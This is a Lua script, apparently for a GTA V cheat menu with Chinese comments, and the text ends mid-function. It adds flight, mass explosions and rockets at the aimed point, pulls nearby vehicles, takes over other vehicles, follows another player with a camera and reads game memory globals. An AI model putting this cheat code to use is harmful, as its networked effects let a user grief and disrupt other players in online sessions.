function AddControlInstruction(scaleform, index, control, message) -- 字体动画
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_DATA_SLOT")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(index)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(2, control, true))
    ButtonMessage(message)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
end
function TheQQflyScale(scaleform)
    local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE(scaleform)
    while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
        util.yield()
    end
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "CLEAR_ALL")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_CLEAR_SPACE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(200)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    AddControlInstruction(scaleform, 2, 21, "漂移")
    AddControlInstruction(scaleform, 1, 51, "氮气")
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_BACKGROUND_COLOUR")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(80)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    return scaleform
end
lastEffectTime = 0
effectCooldown = 0
function vehfx_to() -- 氮气效果
	myvehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
	if ENTITY.DOES_ENTITY_EXIST(myvehicle) and VEHICLE.IS_VEHICLE_DRIVEABLE(myvehicle, false) then
		local currentTime = util.current_time_millis()
		if currentTime - lastEffectTime >= effectCooldown then
			local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(myvehicle, "exhaust")
			request_ptfx_asset("veh_xs_vehicle_mods")
			GRAPHICS.USE_PARTICLE_FX_ASSET("veh_xs_vehicle_mods")
			GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
				"veh_nitrous",
				myvehicle,
				0, 0, 0,
				0, 0, 0,
				bone, 1, true, false, false
			)
			lastEffectTime = currentTime
		end
	end
end
--
function tp_on_top(player, ent, match_velocity)
    if not ENTITY.DOES_ENTITY_EXIST(ent) then
        return false
    end
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(ent), minimum, maximum)
    local minimum_vec = v3.new(minimum)
    local maximum_vec = v3.new(maximum)
    local ent_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ent, 0, 0, minimum_vec.z + maximum_vec.z)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(player, ent_pos.x, ent_pos.y, ent_pos.z, false, false, false)
    if match_velocity then
        local ent_velocity = ENTITY.GET_ENTITY_VELOCITY(ent)
        ENTITY.SET_ENTITY_VELOCITY(player, ent_velocity.x, ent_velocity.y, ent_velocity.z)
    end
    return true
end
--
g = {
    remote_controlled_vehicle = nil,
    remote_controller_vehicle = nil
}
function remote_control_vehicle(veh)
    if not entities.request_control(veh, 4000) then
        util.toast("无法控制")
        return false
    end
    if g.remote_controlled_vehicle == veh then
        return false
    end
    local model = ENTITY.GET_ENTITY_MODEL(veh)
    local spawned = entities.create_vehicle(model, players.get_position(players.user()), 0.0)
    ENTITY.SET_ENTITY_ALPHA(spawned, 0, false)
    if not VEHICLE.IS_THIS_MODEL_A_BIKE(model) then
        ENTITY.SET_ENTITY_VISIBLE(spawned, false, false)
    end
    ENTITY.SET_ENTITY_INVINCIBLE(spawned, true)
    local heading = ENTITY.GET_ENTITY_HEADING(veh)
    local rotation = ENTITY.GET_ENTITY_ROTATION(veh, 2)
    local coords = ENTITY.GET_ENTITY_COORDS(veh, false)
    local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(spawned, coords.x, coords.y, coords.z, false, false, false)
    ENTITY.SET_ENTITY_HEADING(spawned, heading)
    ENTITY.SET_ENTITY_ROTATION(spawned, rotation.x, rotation.y, rotation.z, 2, true)
    ENTITY.SET_ENTITY_VISIBLE(veh, true, false)
    ENTITY.SET_ENTITY_COLLISION(veh, false, false)
    ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(veh, 4)
    VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(veh, false)
    VEHICLE.SET_VEHICLE_MAX_SPEED(veh, 0.0001)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(veh, spawned, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 0, true, false)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawned, -1)
    VEHICLE.SET_VEHICLE_ENGINE_ON(spawned, true, true, false)
    ENTITY.SET_ENTITY_VELOCITY(spawned, velocity.x, velocity.y, velocity.z)
    VEHICLE.COPY_VEHICLE_DAMAGES(veh, spawned)
    g.remote_controlled_vehicle = spawned
    g.remote_controlled_vehicle = veh
    return true
end
--
forward_Speed = 1.0 -- 移动速度
play_ped = players.user_ped() -- 玩家
float_amplitude = 0.01  -- 浮动幅度
float_frequency = 4.0  -- 浮动频率
float_offset = 0.0     -- 浮动偏移量
initial_rotation = v3(0, 0, 0)  -- 保存初始旋转值
function set_status_text(scaleform_name, instructions) -- 绘制按键
    local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE(scaleform_name)
    while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
        util.yield(0)
    end
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "CLEAR_ALL")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_CLEAR_SPACE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(200)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    for _, instruction in ipairs(instructions) do
        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_DATA_SLOT")
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(instruction.index)
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING(PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(2, instruction.control, true))
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_PLAYER_NAME_STRING(instruction.message)
        GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    end
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_BACKGROUND_COLOUR")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(255)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(150)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(235)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(80)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(scaleform, 1, 1, 1, 1, 0)
end
function load_animation_dict(dict) -- 请求动作
    if STREAMING.HAS_ANIM_DICT_LOADED(dict) then
        return true
    end
    for i = 0, 34 do  
        STREAMING.REQUEST_ANIM_DICT(dict)
        util.yield()  
        if STREAMING.HAS_ANIM_DICT_LOADED(dict) then
            return true
        end
    end
    return STREAMING.HAS_ANIM_DICT_LOADED(dict)
end
function ped_play_animation(ped, animDict, animName, speed, speedMultiplier, duration, flag, playbackRate, lockPos, pos, rot, ik_flags) -- 播放动作
    playbackRate = playbackRate or 1.0
    lockPos = lockPos or false
    pos = pos or {x = 0, y = 0, z = 0}
    rot = rot or {x = 0, y = 0, z = 0}
    ik_flags = ik_flags or 0
    if load_animation_dict(animDict) then
        if pos.x == 0 and pos.y == 0 and pos.z == 0 then
            TASK.TASK_PLAY_ANIM(ped, animDict, animName, speed, speedMultiplier, duration, flag, playbackRate, lockPos, lockPos, lockPos)
        else
            TASK.TASK_PLAY_ANIM_ADVANCED(ped, animDict, animName, pos.x, pos.y, pos.z, rot.x, rot.y, rot.z, speed, speedMultiplier, duration, flag, playbackRate, lockPos, ik_flags)
        end
    end
end
function set_initial_position() -- 设置默认位置
    local player_pos = ENTITY.GET_ENTITY_COORDS(play_ped)
    local ground_z_ptr = memory.alloc_float()  
    MISC.GET_GROUND_Z_FOR_3D_COORD(player_pos.x, player_pos.y, player_pos.z, ground_z_ptr, false, false)
    local ground_z = memory.read_float(ground_z_ptr)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(play_ped, player_pos.x, player_pos.y, ground_z + 2, true, true, true)
    memory.free(ground_z_ptr)
end
function gravitate(ent, coord, speed) -- 弹射实体到目标点
    local pos = ENTITY.GET_ENTITY_COORDS(ent)
    local direction = {
        x = coord.x - pos.x,
        y = coord.y - pos.y,
        z = coord.z - pos.z
    }
    local velocity = {
        x = direction.x * speed,
        y = direction.y * speed,
        z = direction.z * speed
    }
    ENTITY.SET_ENTITY_VELOCITY(ent, velocity.x, velocity.y, velocity.z)
end
is_animation_playing = false
is_animation_playing2 = false
function apply_fly_animations1() -- 动作1
    if not is_animation_playing then
        is_animation_playing = true
        is_animation_playing2 = false 
        TASK.CLEAR_PED_TASKS(play_ped) 
        ped_play_animation(play_ped, "missfam5_yoga", "c8_to_start", 4, 1, -1, 49, 0 | 4)
        ped_play_animation(play_ped, "skydive@parachute@first_person", "chute_idle_alt_lookright", 4, 1, -1, 1 | 1048576)
    end
end
function apply_fly_animations2() -- 动作2
    if not is_animation_playing2 then
        is_animation_playing2 = true
        is_animation_playing = false 
        TASK.CLEAR_PED_TASKS(play_ped) 
        ped_play_animation(play_ped, "mp_int_mcs_18_a1-0", "cs_chrisformage_dual-0", 8.0, 8.0, -1, 49, 0.3)  -- 上身动作
        ped_play_animation(play_ped, "skydive@parachute@first_person", "chute_idle_alt_lookright", 4, 1, -1, 1 | 1048576 | 64, 0.3)  -- 下身动作
    end
end
function apply_fly_animations3() -- 动作3
    ped_play_animation(play_ped, "move_fall@beastjump", "high_land_stand", 4, -4, 2000, 4,0) -- 全身动作
end
function stop_atins() -- 清除动作
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(play_ped)
end
function fly_forward_on() -- 飞行开启
    local instructions = {
        { index = 1, control = 237, message = "导弹" },  -- 左鼠标键
        { index = 2, control = 238, message = "激光" },  -- 右鼠标键
        { index = 3, control = 38, message = "轰炸" },       -- E 键
        { index = 4, control = 45, message = "原子" },       -- R 键
        { index = 5, control = 323, message = "吸车" },       -- X 键
        { index = 6, control = 29, message = "闪现" },       -- B 键
        { index = 7, control = 21, message = "加速" },    -- Shift 键
        { index = 8, control = 203, message = "上升" },      -- 空格键
        { index = 9, control = 36, message = "下降" }      -- Ctrl 键
    }
    set_status_text("instructional_buttons", instructions)
    ENTITY.SET_ENTITY_HAS_GRAVITY(play_ped, false)
    ENTITY.SET_ENTITY_ANIM_CURRENT_TIME(play_ped, "missfam5_yoga", "c8_to_start", 0.3)
    local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local player_pos = ENTITY.GET_ENTITY_COORDS(play_ped)
    local forward_vector = v3(camrot.x, camrot.y, camrot.z):toDir()
    local right_vector = v3(forward_vector.y, -forward_vector.x, 0)
    local left_vector = v3(-forward_vector.y, forward_vector.x, 0)
    local target_pos = v3(player_pos.x, player_pos.y, player_pos.z)
    local result = gameplay_cam_track(1, 1000)
    local hit, end_coords, surface_normal, hit_entity = result[1], result[2], result[3], result[4]
    GRAPHICS.DRAW_MARKER_SPHERE(end_coords.x, end_coords.y, end_coords.z, 1, 255, 150, 235, 255, 150)
    GRAPHICS.DRAW_MARKER(28, end_coords.x, end_coords.y, end_coords.z, 0, 0, 0, 0, 0, 0, 1.5, 1.5, 1.5, 255, 0, 0, 150, false, true, 2, 2, 0, 0, false)
    STREAMING.REQUEST_NAMED_PTFX_ASSET("scr_rcbarry1")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry1")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_alien_disintegrate", player_pos.x, player_pos.y, player_pos.z -1.5, 0, 0, 0, 0.3, false, false, false)
    draw_string(string.format("射程位置: X: %.2f, Y: %.2f, Z: %.2f", end_coords.x, end_coords.y, end_coords.z), 0.5, 0, 0.3)
    if util.is_key_down(0x58) then -- X键吸附载具
        local allveh = entities.get_all_vehicles_as_handles()
        for i = 1, #allveh do
            local veh = allveh[i]
            local veh_pos = ENTITY.GET_ENTITY_COORDS(veh)
            if v3.distance(end_coords, veh_pos) < 50 then
                gravitate(veh, end_coords, 5000)
            end
        end
    end
    if util.is_key_down(0x02) then -- 右键激光 
        laser_eyes(play_ped)
    end
    if PAD.IS_CONTROL_PRESSED(0, 51) then -- E键轰炸 
        local explosion_coords = { x = end_coords.x, y = end_coords.y, z = end_coords.z }
        local num_explosions = 20
        local initial_radius = 5.0  
        local radius_increment = 1.0 
        for i = 1, num_explosions do
            local current_radius = initial_radius + (i - 1) * radius_increment
            local points_per_radius = 10
            local angle_step = 2 * math.pi / points_per_radius
            for j = 0, points_per_radius - 1 do
                local angle = j * angle_step
                local explosion_x = explosion_coords.x + current_radius * math.cos(angle)
                local explosion_y = explosion_coords.y + current_radius * math.sin(angle)
                FIRE.ADD_EXPLOSION(explosion_x, explosion_y, explosion_coords.z, 5, 1.0, true, false, 0.0, false)
            end
            util.yield(20)
        end
    end
    if util.is_key_down(0x52) then -- R键原子能 
        local explosion_coords = { x = end_coords.x, y = end_coords.y, z = end_coords.z }
        local num_explosions = 20
        local initial_radius = 5.0  
        local radius_increment = 1.0 
        for i = 1, num_explosions do
            local current_radius = initial_radius + (i - 1) * radius_increment
            local points_per_radius = 10
            local angle_step = 2 * math.pi / points_per_radius
            for j = 0, points_per_radius - 1 do
                local angle = j * angle_step
                local explosion_x = explosion_coords.x + current_radius * math.cos(angle)
                local explosion_y = explosion_coords.y + current_radius * math.sin(angle)
                FIRE.ADD_EXPLOSION(explosion_x, explosion_y, explosion_coords.z, 70, 1.0, true, false, 0.0, false)
            end
            util.yield(20)
        end
    end
    if util.is_key_down(0x01) then -- 按左键发射导弹
        local coords1 = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(play_ped, PED.GET_PED_BONE_INDEX(play_ped, 57005))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords1.x, coords1.y, coords1.z, end_coords.x,end_coords.y, end_coords.z, 1000, true, util.joaat("weapon_airstrike_rocket"), play_ped, true, false, 2000)
        local coords2 = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(play_ped, PED.GET_PED_BONE_INDEX(play_ped, 18905))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords2.x, coords2.y, coords2.z, end_coords.x,end_coords.y, end_coords.z, 1000, true, util.joaat("weapon_airstrike_rocket"), play_ped, true, false, 2000)
        if ped_model == util.joaat("mp_f_freemode_01") then
            coords1.z = coords1.z + 0.02
            coords2.z = coords2.z + 0.02
        end
    end
    if initial_rotation.x == 0 and initial_rotation.y == 0 and initial_rotation.z == 0 then
        initial_rotation = ENTITY.GET_ENTITY_ROTATION(play_ped, 0)
    end
    local is_moving = false
    local speed = forward_Speed
    if PAD.IS_CONTROL_PRESSED(0, 21) then  -- Shift键加速
        speed = speed * 4
    end
    if PAD.IS_CONTROL_PRESSED(0, 32) then  -- W键前进
        target_pos = target_pos:add(forward_vector:mul(speed))
        is_moving = true
    elseif PAD.IS_CONTROL_PRESSED(0, 33) then  -- S键后退
        target_pos = target_pos:sub(forward_vector:mul(speed))
        is_moving = true
    elseif PAD.IS_CONTROL_PRESSED(0, 34) then  -- A键向左
        target_pos = target_pos:add(left_vector:mul(speed))
        is_moving = true
    elseif PAD.IS_CONTROL_PRESSED(0, 35) then  -- D键向右
        target_pos = target_pos:add(right_vector:mul(speed))
        is_moving = true
    end
    if PAD.IS_CONTROL_PRESSED(0, 22) then  -- 空格键升高
        target_pos = v3(target_pos.x, target_pos.y, target_pos.z + speed)
    elseif PAD.IS_CONTROL_PRESSED(0, 36) then  -- CTRL键下降
        target_pos = v3(target_pos.x, target_pos.y, target_pos.z - speed)
    end
    if not is_moving then
        apply_fly_animations1()
        local current_time = os.clock()
        float_offset = math.sin(current_time * float_frequency) * float_amplitude
        target_pos = v3(target_pos.x, target_pos.y, target_pos.z + float_offset)
    else
        apply_fly_animations2()
        ENTITY.SET_ENTITY_ROTATION(play_ped, 0, 0, camrot.z, 0, true)
    end
    if PAD.IS_CONTROL_PRESSED(0, 29) then -- 按B传送目标点
        local move_speed = 30
        local distance_to_target = v3.distance(player_pos, end_coords)
        if distance_to_target > move_speed then
            local direction_to_target = v3(end_coords.x - player_pos.x, end_coords.y - player_pos.y, end_coords.z - player_pos.z):normalise()
            local new_pos = player_pos:add(direction_to_target:mul(move_speed))
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(play_ped, new_pos:getX(), new_pos:getY(), new_pos:getZ(), true, true, true)
        else
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(play_ped, end_coords.x, end_coords.y, end_coords.z + 1, true, true, true)
        end
    else
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(play_ped, target_pos:getX(), target_pos:getY(), target_pos:getZ(), true, true, true)
    end
end
function fly_forward_off() -- 飞行关闭
    ENTITY.SET_ENTITY_HAS_GRAVITY(play_ped, true)
    ENTITY.SET_ENTITY_VELOCITY(play_ped, 0, 0, 0)
    my_pos = ENTITY.GET_ENTITY_COORDS(play_ped) 
    FIRE.ADD_EXPLOSION(my_pos.x, my_pos.y, my_pos.z, 1, 1, true, false, 0, false)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(play_ped)
end
function tp_my_pos() -- 传送回地面
    my_pos = ENTITY.GET_ENTITY_COORDS(play_ped) 
    ground_z = memory.alloc_float()
    if MISC.GET_GROUND_Z_FOR_3D_COORD(my_pos.x, my_pos.y, my_pos.z, ground_z, true) then
        local ground_height = memory.read_float(ground_z)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(play_ped, my_pos.x, my_pos.y, ground_height, true, true, true)
    else
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(play_ped, my_pos.x, my_pos.y, my_pos.z, true, true, true)
    end
    memory.free(ground_z) -- 释放内存
end
--
function laser_eyes_v8(playerPed)
    local coordsList = {
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, -1.0, 100.0, 1.0),
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 1.0, 100.0, 1.0),
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 1.0, 100.0, -1.0),
        ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, -1.0, 100.0, -1.0)
    }
    local ped = players.user_ped()
    local ped_model = ENTITY.GET_ENTITY_MODEL(ped)
    local coords0from = PED.GET_PED_BONE_COORDS(playerPed, 25260, 0.0, 0.0, 0.0)
    local coords1from = PED.GET_PED_BONE_COORDS(playerPed, 27474, 0.0, 0.0, 0.0)
    local coords0to = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 0.0, 100.0, 0.0)
    local HeatVision = util.joaat("WEAPON_RAILGUN")
    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords0from.x, coords0from.y, coords0from.z, coords0to.x, 
    coords0to.y, coords0to.z, 250, true, HeatVision, playerPed, false, true, 1.0)
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(coords1from.x, coords1from.y, coords1from.z, coords0to.x, 
    coords0to.y, coords0to.z, 250, true, HeatVision, playerPed, false, true, 1.0)
    if ped_model == 225514697 then
        coords0from.z = coords0from.z + 0.8
        coords1from.z = coords1from.z + 0.8
    end
    cam_rot.x = cam_rot.x -90
    request_ptfx_asset("weap_xs_weapons")
    GRAPHICS.USE_PARTICLE_FX_ASSET("weap_xs_weapons")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("bullet_tracer_xs_sr", coords0from.x, coords0from.y, 
    coords0from.z, cam_rot.x, cam_rot.y, cam_rot.z, 2, false, false, false)
    request_ptfx_asset("weap_xs_weapons")
    GRAPHICS.USE_PARTICLE_FX_ASSET("weap_xs_weapons")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("bullet_tracer_xs_sr", coords1from.x, coords1from.y, 
    coords1from.z, cam_rot.x, cam_rot.y, cam_rot.z, 2, false, false, false)
end
function setupScaleformV(scaleform)
    local scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE(scaleform)
    while not GRAPHICS.HAS_SCALEFORM_MOVIE_LOADED(scaleform) do
        wait(0)
    end
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "CLEAR_ALL")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_CLEAR_SPACE")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(200)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    AddControlInstruction(scaleform, 2, 51, "冲刺") --E键
    AddControlInstruction(scaleform, 1, 25, "激光") -- 右键
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(scaleform, "SET_BACKGROUND_COLOUR")
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(0)
    GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_INT(80)
    GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
    return scaleform
end
--
function laoying(on)
    if on then
        local feiying = 2864127842
        local mycoords = players.get_position(players.user())
        request_model(feiying)
        fly = CreatePed(26, feiying, mycoords, 0)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(mycoords.x, mycoords.y, mycoords.z, 
        mycoords.x, mycoords.y, mycoords.z, 1, true, 0xDBBD7280, players.user_ped(), true, false, 1)
        util.create_tick_handler(function()
            local playerPed = players.user_ped()
            local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
            local behindCoords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 0.0, -0.5, 0.3)
            ENTITY.SET_ENTITY_COLLISION(fly, false, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fly, behindCoords.x, behindCoords.y, behindCoords.z, false, false, false)
            ENTITY.SET_ENTITY_ROTATION(fly, camRot.x + 25, camRot.y, camRot.z, 2, true)
            ENTITY.SET_ENTITY_INVINCIBLE(fly, true)
            PED.CLEAR_PED_BLOOD_DAMAGE(fly)
        end)
    else
        entities.delete_by_handle(fly)
    end
end
--
镜头高度 = 10
function 启用镜头(pid)
    local 玩家位置 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    玩家镜头 = CAM.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", 
        玩家位置.x, 玩家位置.y, 玩家位置.z + 镜头高度, 
        0.0, 0.0, 0.0, 200.0, true, true)
    CAM.SET_CAM_ACTIVE(玩家镜头, true)
    CAM.RENDER_SCRIPT_CAMS(true, true, 1000, true, true, 0)
    while true do
        if PAD.IS_CONTROL_PRESSED(0, 36) then  -- Ctrl键
            镜头高度 = 镜头高度 - 0.1  
        end
        if PAD.IS_CONTROL_PRESSED(0, 22) then  -- 空格键
            镜头高度 = 镜头高度 + 0.1  
        end
        玩家位置 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local 游戏镜头旋转 = CAM.GET_GAMEPLAY_CAM_ROT(2)
        CAM.SET_CAM_COORD(玩家镜头, 玩家位置.x, 玩家位置.y, 玩家位置.z + 镜头高度)
        CAM.SET_CAM_ROT(玩家镜头, 游戏镜头旋转.x, 游戏镜头旋转.y, 游戏镜头旋转.z, 2)
        wait()
    end
end
function 禁用镜头()
    if 玩家镜头 ~= nil then
        CAM.SET_CAM_ACTIVE(玩家镜头, false)
        CAM.DESTROY_CAM(玩家镜头, true)
        CAM.RENDER_SCRIPT_CAMS(false, true, 1000, true, true, 0)
        玩家镜头 = nil
    end
end
--
function is_loading_into_session()
    return memory.read_int(memory.script_global(1574988)) == 66 or not PLAYER.IS_PLAYER_CONTROL_ON(players.user())
end
function is_player_passive(pid)
    return memory.read_int(memory.script_global(1892703 + (pid * 599 + 1) + 8)) == 1
end
TraceFlag =
{
	everything = 4294967295,
	none = 0,
	world = 1,
	vehicles = 2,
	pedsSimpleCollision = 4,
	peds = 8,
	objects = 16,
	water = 32,
	foliage = 256,
}
function get_offset_from_cam(dist)
	local rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
	local pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
	local dir = rot:toDir()
	dir:mul(dist)
	local offset = v3.new(pos)
	offset:add(dir)
	return offset
end
function get_raycast_result(dist, flag)
	local result = {}
	flag = flag or TraceFlag.everything
	local didHit = memory.alloc(1)
	local endCoords = v3.new()
	local normal = v3.new()
	local hitEntity = memory.alloc_int()
	local camPos = CAM.GET_FINAL_RENDERED_CAM_COORD()
	local offset = get_offset_from_cam(dist)
	local handle = SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
		camPos.x, camPos.y, camPos.z,
		offset.x, offset.y, offset.z,
		flag,
		players.user_ped(), 7
	)
	SHAPETEST.GET_SHAPE_TEST_RESULT(handle, didHit, endCoords, normal, hitEntity)
	result.didHit = memory.read_byte(didHit) ~= 0
	result.endCoords = endCoords
	result.surfaceNormal = normal
	result.hitEntity = memory.read_int(hitEntity)
	return result
end
--
numDaggers = 6  
daggers = {} 
daggerParams = {} 
fireRate = 0.5  
function initDaggerParams()
    daggerParams = {}  
    for i = 1, numDaggers do
        daggerParams[i] = {
            angle = math.random() * 2 * math.pi,  
            radius = 0.6 + math.random() * 0.3,  
            speed = 0.01 + math.random() * 0.05,  
            zSpeed = 0.01 + math.random() * 0.01,  
            rotationSpeed = 1.0 + math.random() * 2.0  
        }
    end
end
function shootDagger()
    local playerCoords = players.get_position(players.user())
    local forwardVector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
    local shootPos = v3.new(playerCoords.x, playerCoords.y, playerCoords.z)
    shootPos = v3.add(shootPos, v3.mul(forwardVector, 2.0))  
    if #daggers > 0 then
        local dagger = table.remove(daggers, 1)  
        if dagger and ENTITY.DOES_ENTITY_EXIST(dagger) then
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dagger, v3.getX(shootPos), v3.getY(shootPos), v3.getZ(shootPos), false, false, false)
            local rotation = v3.lookAt(shootPos, playerCoords)
            ENTITY.SET_ENTITY_ROTATION(dagger, v3.getX(rotation), v3.getY(rotation), v3.getZ(rotation), 2, true)
            local speed = 50.0  
            local forwardSpeed = v3.mul(forwardVector, speed)
            local totalVelocity = forwardSpeed  
            ENTITY.SET_ENTITY_VELOCITY(dagger, v3.getX(totalVelocity), v3.getY(totalVelocity), v3.getZ(totalVelocity))
            daggerParams[#daggerParams + 1] = {
                angle = 0, 
                radius = 0.6 + math.random() * 0.3,  
                speed = 0.01 + math.random() * 0.05,  
                zSpeed = 0.01 + math.random() * 0.01, 
                rotationSpeed = 1.0 + math.random() * 2.0 
            }
        end
    end
end
function load_dark_axe(开关)
    变量 = 开关
    local angle = 0
    local rotation_speed = 0.02 
    local move_speed = 0.05  
    local move_direction = 1 
    local generated = false
    local holding = false  
    local thrown = false  
    local throw_time = 0  
    local delay = 100
    local give_weapon_to_ped = function()
        WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 1317494643, 15, true, true)
        WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(players.user_ped(), 0, 0, 0, 0)
    end
    local remove_weapon_from_ped = function()
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(), 1317494643)
